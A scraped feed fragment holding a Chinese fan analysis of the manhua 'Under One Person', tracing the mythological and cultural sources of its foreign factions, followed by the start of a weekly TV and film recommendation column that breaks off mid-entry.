data-original-src=\"v2-bef177f905feaa58d87b0df1ce44032f\" data-watermark-src=\"v2-36a9bc65b675dd9c5091b8a4562fe1ba\" data-private-watermark-src=\"\"></p>\n<p>赫伯特·斯宾塞；英国哲学家、社会学家、教育家。他为人所共知的就是“社会达尔文主义之父”，所提出一套的学说把进化理论适者生存应用在社会学上尤其是教育及阶级斗争，是在理论上阐述进化论的英国哲学家先驱。也是艺术起源中游戏说的提出者（游戏说认为：艺术是天赋者内心剩余精力的发泄）；上期提到弗雷泽，这次提到斯宾塞，二叔难不成在研究艺术史？（个人猜想）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d01fa95a61de33b56d2edc6dc15db35e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"668\" data-rawheight=\"334\" data-watermark=\"watermark\" data-original-src=\"v2-d01fa95a61de33b56d2edc6dc15db35e\" data-watermark-src=\"v2-0583761f101e4514d12659d11ff398ac\" data-private-watermark-src=\"\"></p>\n<p>对了，斯宾塞认为：教育的目的和任务在于教导每一个人怎样去过“完美”的生活。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-93274408b1148217e8aa69e832be1de0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"153\" data-watermark=\"watermark\" data-original-src=\"v2-93274408b1148217e8aa69e832be1de0\" data-watermark-src=\"v2-84174332148a9b658743bb11d40655ca\" data-private-watermark-src=\"\"></p>\n<h2><b>大地之子</b></h2>\n<p>说实话，结合人种妆容服饰，这位莉莉娅会长以及她所在大地之子工会都没有太多的可以确定的东西；只能说个人感觉更接近南美或北非的服饰风格（个人猜测）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-05c620f5cf8bcb5570e3185e079d47de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-05c620f5cf8bcb5570e3185e079d47de\" data-watermark-src=\"v2-183738600455eac099cba3213058c2b3\" data-private-watermark-src=\"\"></p>\n<p><b>1.盖亚</b></p>\n<p>同样的，大地之子也并没有太多联想到的线索，如果有其他想法法朋友欢迎在评论区写出；非要说的话，北非南美宗教受希腊影响出现的盖亚崇拜可能与之有那么一点关联；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b39ff62096684d4180411a3d27eb4031_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"265\" data-watermark=\"watermark\" data-original-src=\"v2-b39ff62096684d4180411a3d27eb4031\" data-watermark-src=\"v2-39b2ae92c46435073ec77a097af9bc07\" data-private-watermark-src=\"\"></p>\n<p>盖亚：也是希腊神话中第一位超原始神明，她是大地的神格化，是第一位真正意义上的创世神，也是能创造生命的原始自然力之一（大地）。她的出现标志着混沌开始由无序转为有序，也标志着万物开始产生。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3caa769ea33b9b39244e59a088e4b0e9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"232\" data-watermark=\"watermark\" data-original-src=\"v2-3caa769ea33b9b39244e59a088e4b0e9\" data-watermark-src=\"v2-c8e44777b06eec8bc9dacc473d21d1fb\" data-private-watermark-src=\"\"></p>\n<p><b>2.那罗伽</b></p>\n<p>那罗伽是古印度神话中的阿修罗王，也曾被称为：大地之子。他曾将阿底提的耳环盗至其城堡钵罗耆阍奥提娑。后来，黑天受诸天神之托，杀死那罗伽，夺回此宝。而且在梵语中那罗伽被音译为地狱；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fba7c4727a8a97ff0e976d05185e9034_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1151\" data-rawheight=\"409\" data-watermark=\"watermark\" data-original-src=\"v2-fba7c4727a8a97ff0e976d05185e9034\" data-watermark-src=\"v2-13bf891748e55f62c3f37845b9e96aca\" data-private-watermark-src=\"v2-89092d03a30d4ba7b3bafed6ea332535\"></p>\n<p><b>3.地母神</b></p>\n<p>还有知友 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/cff24f1b490a04946b663b40a4584ee3\" data-hash=\"cff24f1b490a04946b663b40a4584ee3\" data-hovercard=\"p$b$cff24f1b490a04946b663b40a4584ee3\">@幻化千叶</a> 提到的：个人理解，大地之子应该是信仰地母神的女巫组织。莉莉娅女士的装扮有明显的吉普赛女巫的特色（头巾和略显浮夸的首饰）。地母神，亦称为大地之母或母神是指专司繁殖力及象征大地恩惠的女神，在这个范畴中并不是所有的女神都能被称呼为地母神。随着一神教的流行，地母神极其祭祀也逐渐沦为魔女或者女巫。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-94632f5746f373f8728301bdf3868f1e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"742\" data-rawheight=\"211\" data-watermark=\"watermark\" data-original-src=\"v2-94632f5746f373f8728301bdf3868f1e\" data-watermark-src=\"v2-7353ad236e55ad11b04de3b4a2a5a641\" data-private-watermark-src=\"v2-5f8faefb9925d4f6a5003325c937dfbf\"></p>\n<p>如果这里的巫女元素匹配，就和之前以利亚弄错的波曼可以相联结（不过波曼属于巫毒体系）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3389f7850e4bb51872774653509cd9cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"739\" data-rawheight=\"284\" data-watermark=\"watermark\" data-original-src=\"v2-3389f7850e4bb51872774653509cd9cd\" data-watermark-src=\"v2-8892881f519566a3a445b29ae57f3eee\" data-private-watermark-src=\"v2-1d2ada378130714191a976f74fa6aae4\"></p>\n<p>如果这里的大地之子不是个比喻句的话，那或许他们的官方也掌握着和节气谷纳森岛类似的仙踪；（个人猜测）</p>\n<h2>异人馆</h2>\n<p>在泰国，有很强的会馆文化，所谓会馆原本是指各地商户在外地互相帮扶的聚集地店；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-10962455d126d341a6d77c422ce0fe71_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-10962455d126d341a6d77c422ce0fe71\" data-watermark-src=\"v2-7ff93898e272fbd7bd09458514b055a8\" data-private-watermark-src=\"\"></p>\n<p><b>1.九属会馆</b></p>\n<p>泰国有九属会馆，九属是：潮州，客家，广府，福建，海南，云南，广西，浙江和台湾；九家会馆。一般是这些地方的华人后裔建立的，他们对中国的了解要比普通泰国人深入的多。但是其实也带有他们独特的视角和宗族理念。尤其是看待来泰国工作投资的中国人，就带有一定的利益连带关系。而与之相似的，所谓异人馆可能就是异人之间相互帮扶的机密组织吧；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b7624306035dae20d77c8fdd3a167cb3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"927\" data-rawheight=\"374\" data-watermark=\"watermark\" data-original-src=\"v2-b7624306035dae20d77c8fdd3a167cb3\" data-watermark-src=\"v2-fb6b827faf1f2d4758b1f49e185e5b0f\" data-private-watermark-src=\"\"></p>\n<p><b>2.查侬</b></p>\n<p>众所周知这个篇章是用来填坑的，世界上有那么多国家和地区；泰国能有如此待遇除了泰国本身丰富的历史文化外，更重要可能就是与之前出现的的关系；漫画344话比比肺活量中查侬的这一招应该是泰拳中的神猴腾空（ HakKung Ai-yara）这招出自一个泰国的神庙传说；是猴神曼加尔的法相显现；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8cbc94f7d6ab91fd060175f4442f3435_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"823\" data-rawheight=\"432\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>石川流</b></h2>\n<p>佛剑石川家所在的门派，之前已经介绍过几次他们的过去了，这里就不赘述了；目前已知下图左手是石川信的儿子，右边是日本异人组织的成员；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d4a02c659c0d5317812c73c7c7404990_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"306\" data-watermark=\"watermark\" data-original-src=\"v2-d4a02c659c0d5317812c73c7c7404990\" data-watermark-src=\"v2-13270685ffa18beac3a8a28c0bcb66f9\" data-private-watermark-src=\"\"></p>\n<p><b>1.石川流</b></p>\n<p>这次用的称呼不是石川家了而是石川流，因为这里女子的称呼是会长，说明石川信并不只是以家族或个人的身份来访，而是日本类似哪都通部门的会长；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7e003e39bca229afe3dfeff7a89aaea6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"165\" data-watermark=\"watermark\" data-original-src=\"v2-7e003e39bca229afe3dfeff7a89aaea6\" data-watermark-src=\"v2-f582d396dacb905ec47d84fa67aa4b7c\" data-private-watermark-src=\"\"></p>\n<p><b>2.妖刀蛭丸</b></p>\n<p>另一方面，在说到纳森卫的承诺时，石川信说，和他们相似，这里应该就是指妖刀蛭丸；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-986597f6a9d5076ac3070e7f8d2c71fc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"280\" data-watermark=\"watermark\" data-original-src=\"v2-986597f6a9d5076ac3070e7f8d2c71fc\" data-watermark-src=\"v2-c2b2dafc80599599be28a84c05533bca\" data-private-watermark-src=\"\"></p>\n<p>结合上回所说的时代守护；那么蛭丸（蛭是一类生物的统称，以多营暂时性的体外寄生生活，以吸食其他动物的体液或血液为生。）这个名字漫画中对炼器和剑仙的解释；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c2ec44c23eff7d48d2b697bd5bee12f0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"227\" data-watermark=\"watermark\" data-original-src=\"v2-c2ec44c23eff7d48d2b697bd5bee12f0\" data-watermark-src=\"v2-77e2dae0d82f5d8b3d9e40f9e94f0068\" data-private-watermark-src=\"\"></p>\n<p>我觉得可能石川家之前已经世世代代用炁在喂养这把本寓意着不详的妖刀；甚至以及和漫画中的“家仙”一样成为了某种家族象征；（上周也提到过就不过多赘述了）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c1e1cb4704f934490d8976581a99360_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"263\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>贝希摩斯</b></h2>\n<p>贝希摩斯，漫画中提到的一家新兴的美国公司，能用工业手段制造法器；服务遍布世界，虽然成立的时间不长，却有一定的野心；并且并未确定其是否完全代表美国异人（毕竟只是一家公司）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4d3d10b31ee234f0a1552dbf503b4d8e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"345\" data-watermark=\"watermark\" data-original-src=\"v2-4d3d10b31ee234f0a1552dbf503b4d8e\" data-watermark-src=\"v2-d696d5e1ec95d404948ac488b1272c8c\" data-private-watermark-src=\"\"></p>\n<p><b>1.贝希摩斯</b></p>\n<p>贝希摩斯（Behemoth）是在《圣经》中出现的怪物，传说上帝在创世纪第六天用粘土创造了贝希摩斯和利维坦，它的尾巴如杉木般挺直，肌肉如石头般结实，骨骼如铜铁般坚硬。在中世纪的时候他被恶魔诱惑加入了地狱的阵容。旧约解经书《米大示》称其为无敌的生物，只有耶和华的剑才能杀死它。而《次经》中提到“一饱口福”云云，当指末日的弥赛亚盛宴。那时巨兽和海魔将会大战，最后同归于尽，与巨鸟席兹一起成为圣洁者的食物。另有种说法它们都将被投入深渊。   （下图可以颠倒过来看）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2e5b453bbb68e0457db1fb5da8648995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1184\" data-rawheight=\"682\" data-watermark=\"watermark\" data-original-src=\"v2-2e5b453bbb68e0457db1fb5da8648995\" data-watermark-src=\"v2-815be0e9ef037bc0bf54ac6578eee237\" data-private-watermark-src=\"\"></p>\n<p>但其实，抛开这些复杂的设定，贝希摩斯最直观的特点就是两个：巨大与贪婪；就和中国神话中的饕餮一样；二叔设定上的指代似乎也已经不言而喻了；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7034604529428c5faafb1fbad7250302_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"238\" data-watermark=\"watermark\" data-original-src=\"v2-7034604529428c5faafb1fbad7250302\" data-watermark-src=\"v2-609b80ebcf74dc1fff30836e80a4ea7d\" data-private-watermark-src=\"\"></p>\n<p><b>2.工业法器</b></p>\n<p>在漫画532话中出现了能够翻译常见语种的“助听器”，虽然我们都知道这个道具是为了解决漫画中的预言问题而设计出来的；这十有八九就是贝希摩斯的产品了；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-99a039edfcdd1bc213650a84dc6745cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"851\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-99a039edfcdd1bc213650a84dc6745cd\" data-watermark-src=\"v2-56a95684a65a6bbee23f52dc13244ab7\" data-private-watermark-src=\"\"></p>\n<p>但是注意四哥对这玩意的称呼：半个法器；这似乎也间接说明了贝希摩斯公司已经掌握了工业化打造法器的方法；如果法器可以批量制造，那按照之前的理论：对社会的威胁其实不小于神机百炼；或者反过来说，贝希摩斯有可能受到了神机百炼的协助，才得以批量制造法器（个人脑洞，点到即止）如此看来，在网上与二壮交手的也有可能是贝希摩斯的人；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-74366b8b81c662bbfe21d6662af75948_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"367\" data-watermark=\"watermark\" data-original-src=\"v2-74366b8b81c662bbfe21d6662af75948\" data-watermark-src=\"v2-0ea4024a1fc2d9ffa43f8fa0f2a9f430\" data-private-watermark-src=\"\"></p>\n<p>不过目前看来贝希摩斯对自己的技术把控的还是比较严格的，像下图三哥说的，法器用完还要还给他们；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-60bfb3440f55f169d5d97fca91e79f9e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"237\" data-watermark=\"watermark\" data-original-src=\"v2-60bfb3440f55f169d5d97fca91e79f9e\" data-watermark-src=\"v2-527bd461a9cbf5cc25e3656e14831a69\" data-private-watermark-src=\"\"></p>\n<p>可能就是有了制造生活法器的技术力和批量生产的生产力，贝希摩斯才敢于说自己是家世界公司（这个倒不至于吐槽老美，我们很多企业也已经有了这样的觉悟，全球化终究是必然趋势）可能正是这样的实力贝希摩斯才有底气说出：包括纳森岛吧。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5fc7f76cf3f9bc3b9a20ef16ff01bad7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"829\" data-rawheight=\"296\" data-watermark=\"watermark\" data-original-src=\"v2-5fc7f76cf3f9bc3b9a20ef16ff01bad7\" data-watermark-src=\"v2-43b7833242983496b90f94e6176e9e3a\" data-private-watermark-src=\"\"></p>\n<p>但这里凯勒没有说时态，如果纳森岛已经使用了贝希摩斯的技术那可能岛上的生活水平要比我们之前想象的要好；（毕竟纳森卫都穿的干干净净的）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ab0cf5e7685cc34b7f7b01ac77bc4f47_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"828\" data-rawheight=\"334\" data-watermark=\"watermark\" data-original-src=\"v2-ab0cf5e7685cc34b7f7b01ac77bc4f47\" data-watermark-src=\"v2-2299bd075ed7fb9789fc70eed98f2ea4\" data-private-watermark-src=\"\"></p>\n<p><b>3.美国工会</b></p>\n<p>还是之前那个论调，目前其实不能肯定贝希摩斯是否完全代表美国异人，毕竟贝希摩斯只是一家公司，而且和哪都通不一样，这家公司是以公司为主体的；服务与“世界人民”的公司，那么我有理由相信美国本土应该还是有类似哪都通的存在；毕竟美国缺席上一次异人大会确实不太可能；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-19e164021f30e6d73f9e2f67e1a21357_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"269\" data-watermark=\"watermark\" data-original-src=\"v2-19e164021f30e6d73f9e2f67e1a21357\" data-watermark-src=\"v2-c2208ff2ba221b6269c0ef88b20aa730\" data-private-watermark-src=\"\"></p>\n<h2><b>纳森岛</b></h2>\n<p>纳森岛已经说了三期了，但这次还是有很多新的个人观点想和大家分享；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-af21bfce694261131f83e9444c67a21f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"935\" data-rawheight=\"342\" data-watermark=\"watermark\" data-original-src=\"v2-af21bfce694261131f83e9444c67a21f\" data-watermark-src=\"v2-759d97b4e6ec38a901f4e0640ae890e2\" data-private-watermark-src=\"\"></p>\n<p><b>1.阿方索</b></p>\n<p>首先来说一下小个子阿方索，阿方索这个名字曾为那不勒斯王国皇家所用；不算是一个很常见的名字但是目前没查到有什么隐喻；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3013c9788c8022351a27f1fb3faec5b6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"739\" data-rawheight=\"260\" data-watermark=\"watermark\" data-original-src=\"v2-3013c9788c8022351a27f1fb3faec5b6\" data-watermark-src=\"v2-84c29ced3cbe1fcbf89471d20b935135\" data-private-watermark-src=\"\"></p>\n<p>我之前一直以为，纳瑟卫服务于王是因为某种禁制术，毕竟以利亚亲口说过，自己不喜欢在纳瑟的感觉；所以我以为所谓的为诺言而生是他们被禁制术束缚；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1733b6cb156ea70e3b53f0594c8f30af_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"845\" data-rawheight=\"447\" data-watermark=\"watermark\" data-original-src=\"v2-1733b6cb156ea70e3b53f0594c8f30af\" data-watermark-src=\"v2-d55e4c9c45cbc02a3f5ebd89c26a5cf1\" data-private-watermark-src=\"\"></p>\n<p>但看了阿方索的反映后，我感受到纳森卫，至少阿方索对王的认可是完全发自内心的；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b47099ecaf78fd7ef3dbb463c2d921aa_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"204\" data-watermark=\"watermark\" data-original-src=\"v2-b47099ecaf78fd7ef3dbb463c2d921aa\" data-watermark-src=\"v2-8c35075a749409a035affd13f759043e\" data-private-watermark-src=\"\"></p>\n<p><b>2.纳森王</b></p>\n<p>回来说被宝儿姐干趴下的纳森王，二叔以前就说过如果要画纳森那肯定是个独立的篇章；看得出来纳森卫和宝儿姐一样是个姑娘；至于势力，宝儿姐当时算偷袭，也不能确定王的真实实力；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-00cb0fd1f8df66de93f849444e86aa6e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"335\" data-watermark=\"watermark\" data-original-src=\"v2-00cb0fd1f8df66de93f849444e86aa6e\" data-watermark-src=\"v2-8d492d885c11ec1859d180ba9ad5750b\" data-private-watermark-src=\"\"></p>\n<p>不过有一点可以肯定，就是以利亚说的：王，是神选之人；是异人中的异人；所以王的天赋是毋庸置疑的；所以以利亚才能那么坦诚的说：我们并不是神选之人，</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6a62bcbbd5df67c8c65fda0ec9f87669_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"264\" data-watermark=\"watermark\" data-original-src=\"v2-6a62bcbbd5df67c8c65fda0ec9f87669\" data-watermark-src=\"v2-66849892736005eface7d9773cdd97a3\" data-private-watermark-src=\"\"></p>\n<p>纳森王异人中的异人这点，其实也和宝儿姐非常相似；这却也是张怀义一直叮嘱张楚岚避免成为的人；木秀于林风必摧之；也许正是因此当年大祭司才规定了纳森卫保卫纳森王的传统吧；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e3e4664051dec51b1873b347f57196a9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"316\" data-watermark=\"watermark\" data-original-src=\"v2-e3e4664051dec51b1873b347f57196a9\" data-watermark-src=\"v2-df5dd4d3e0ff91118e40d4fff93bd838\" data-private-watermark-src=\"\"></p>\n<p><b>3.投石问路</b></p>\n<p>这里还有一个问题，那就是他们为什么要袭击三哥？或者说为什么要丢石头？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e99954fe51e74ab9e6adf21c63b0d3a3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"251\" data-watermark=\"watermark\" data-original-src=\"v2-e99954fe51e74ab9e6adf21c63b0d3a3\" data-watermark-src=\"v2-2cd2c1e2901f5a87d598732be038d01c\" data-private-watermark-src=\"v2-b697507364d57b1b6f75716acde6ef50\"></p>\n<p>事出反常必有妖；按照以利亚和阿方索的对话来看，他们仿佛已经知道了会有拦车？甚至这后面的事情可能都有一部分的安排好的；（应该不包括王被暴打）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f022f952062c2ad9c16e65570578d746_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"741\" data-rawheight=\"232\" data-watermark=\"watermark\" data-original-src=\"v2-f022f952062c2ad9c16e65570578d746\" data-watermark-src=\"v2-a3dbbfe867e4b021f66a90fabfd56937\" data-private-watermark-src=\"v2-21ac012c6fa563d5a14d1b185002b28c\"></p>\n<p>那如果是这样纳森方面可能真的拥有某位可以预判危机的角色来策划了这场事件？如果把投石和预判这两个关键词结合起来，去找西方传说中的对应；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1dfea935cdd8bba4d26e4ac7f245933e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"737\" data-rawheight=\"207\" data-watermark=\"watermark\" data-original-src=\"v2-1dfea935cdd8bba4d26e4ac7f245933e\" data-watermark-src=\"v2-6905b714317a8b72e9d498ee4d2bea8d\" data-private-watermark-src=\"v2-55def948b3f4e2875524d62f7dc62410\"></p>\n<p>大卫投石；取材于《旧约》中的神话故事。大卫是一个圣经中的人物，公元前1010年至970年是以色列王。他在位时推翻了异族非利士人的统治，使以色列得到统一。打倒巨人歌利亚的投石器。五块石头代表大卫的宽容，四次会打偏，而第五次必然会命中，并打倒敌人。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-efd9e0a88297551d35e8251d6fce4bb1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"736\" data-rawheight=\"244\" data-watermark=\"watermark\" data-original-src=\"v2-efd9e0a88297551d35e8251d6fce4bb1\" data-watermark-src=\"v2-ba2e7596705519f56c8c546d4a9a7fb3\" data-private-watermark-src=\"v2-a8144fed3b22027e1aaa8b6c347020cd\"></p>\n<p>（以上仅为个人猜测）</p>\n<p><b>个人想法</b></p>\n<p>这个世界上不是所有秘密的答案都叫无根生的，如果是那样的话，那这个世界也太无趣了；其实二叔之前在创作的时候就提到过将来会做外国异人的番外，未知的世界才是更真实有趣的世界；期待后续篇章的更新；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-91e9c0805ee04798b1f7f6b9d315f18e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"192\" data-watermark=\"watermark\" data-original-src=\"v2-91e9c0805ee04798b1f7f6b9d315f18e\" data-watermark-src=\"v2-2870708ebaf07db1f026dd48f16786df\" data-private-watermark-src=\"v2-8fa7ecd0ef22b3672c985808e84ee49d\"></p>\n<hr>\n<p>以下是之前对纳森岛和外国异人的整理和猜测，为了节省篇幅就不在这里赘述了：</p>\n<a href=\"https://www.zhihu.com/question/466970964/answer/1959555863\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-8a848cb4bd5f11f7f3a1b2b24210d254_200x0.jpg\" data-image-width=\"948\" data-image-height=\"2000\" class=\"internal\">如何评价《一人之下》532（565）话？</a><a href=\"https://www.zhihu.com/question/464193183/answer/1934211068\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-bdba958ccddc978a4ff42f0c80af1423_bh.jpg\" data-image-width=\"1600\" data-image-height=\"720\" class=\"internal\">如何评价《一人之下》530（562）话？</a><a href=\"https://www.zhihu.com/column/c_1264966216768692224\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-28243c09e18dc58c62df761ed87850a5_l.jpg\" data-image-width=\"167\" data-image-height=\"167\" class=\"internal\">一人之下•门派录</a><p><img src=\"https://pic2.zhimg.com/v2-5c10e13da4092b73d90f0456e1b82aee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"467\" data-rawheight=\"254\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>整理不易，跪求点赞<br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469386521/answer/1973593333?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">57 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/317204661?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》402话？</a><br><a href=\"http://www.zhihu.com/question/304359766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">一人之下中的马仙洪各位怎么评价？</a><br>\n","link":"http://www.zhihu.com/question/469386521/answer/1973593333?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本周看什么丨最近值得一看的 6 部作品","date":"2021-07-02 09:31:35","description":"\n<h2>TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[美剧] 博世 第七季、[英剧] 争分夺秒、[纪录片] 风味原产地·贵阳 、[电影] 机动战士高达 闪光的哈萨维 第一部、[美剧] 天才神秘会社、[动画] 魔多客</li>\n<li>几则精彩预告：漫改 TV 动画《链锯人》公布预告、怪兽尸体都去哪了？《大怪兽的善后处理》公布预告、动画电影《狼行者》7 月 3 日中国内地上映、Apple TV+ 剧集《基地》9 月 24 日开播</li>\n<li>几则影视资讯：《疾速追杀 4》宣布开机、尼尔·盖曼小说改编剧集《好兆头》确定将拍第二季、漫画《来自深渊》将改编为好莱坞真人电影、日漫改国产真人网剧《月刊少女》开机、辛普森 × 漫威联动短片《The Good, the Bart, and the Loki 》7 月 7 日上线 Disney+、《新世纪福音战士新剧场版：终》8 月 13 日独家登陆 Amazon Prime Video</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[美剧] 博世 第七季（最终季）</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/fc82b003cae241bb57e614666c1cce20\"></figure><p>关键词：剧情 / 悬疑</p>\n<p>片长：45 分钟（单集）× 8 集；<a href=\"https://movie.douban.com/subject/34967836/\">豆瓣链接</a></p>\n<blockquote><p>犯罪永远不会停止。</p></blockquote>\n<p>@潘誉晗：本剧根据麦克·康纳利的系列小说《哈里·博世》改编，由提图斯·维里沃饰演的主人公哈里·博斯是洛杉矶警局的一名探员，故事围绕着博斯办案的日常展开。和以往剧集中对于 LAPD 或者 FBI 的信任不同，《博世》更像是借着这一人物的视角，去发现警察系统甚至是高层政治的腐败。其实案件本身不难，深刻的内核来自对于政治和警察系统的挖掘，看似为了市民好，但却为了自己的仕途或者项目的推进去伤害无辜者的行为，怎能叫人看了不气愤呢？或许这也是最终季中编剧刻意为之的一种结局。的确，本剧大概是近几年完结的罪案剧中看到的最解气的方式，难怪有网友说这是近十年最好的刑侦剧。看似硬汉的博斯却有着最深的温柔，这样的反差很动人，即使在体系中，这样有良心的警察们依旧是有血有肉的。</p>\n<p>很难得可以看到一部罪案剧的终季完结得如此漂亮，虽然只有短短 8 集，但是作为本系列最高的评分以及烂番茄 100% 的新鲜度，很好地证明了观众对于这样的结局很是满意。接下来就耐心且安心地期待 2023 年的衍生剧了。</p>\n<h3>[英剧] 争分夺秒</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/355fb6795f91dc1336b5a918076619bb\"></figure><p>关键词：剧情 / 犯罪</p>\n<p>片长：60 分钟（单集）× 3 集；<a 